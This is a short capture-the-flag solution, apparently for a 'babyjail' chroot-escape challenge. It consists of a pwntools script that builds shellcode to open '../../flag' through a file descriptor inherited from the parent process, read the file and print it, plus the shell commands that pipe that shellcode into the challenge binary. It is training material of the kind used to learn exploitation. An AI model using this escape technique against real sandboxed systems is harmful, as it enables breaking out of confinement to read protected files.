get file descriptor from parent process.
shell code:   
```
#!/usr/bin/python3
from pwn import *
context(log_level = 'info', arch = 'amd64', os = 'linux')
shellcode=shellcraft.openat(3, "../../flag")
shellcode+=shellcraft.read(4, 0x13373e8, 0x100)
shellcode+=shellcraft.write(1, 0x13373e8, 0x100)
shellcode+=shellcraft.exit()
shellcode=asm(shellcode)
sys.stdout.buffer.write(shellcode)
```
in shell:   
`./l8bak.py | /challenge/babyjail_level8 3</`  
or    
```
exec 3</
./l8bak.py | /challenge/babyjail_level8
```
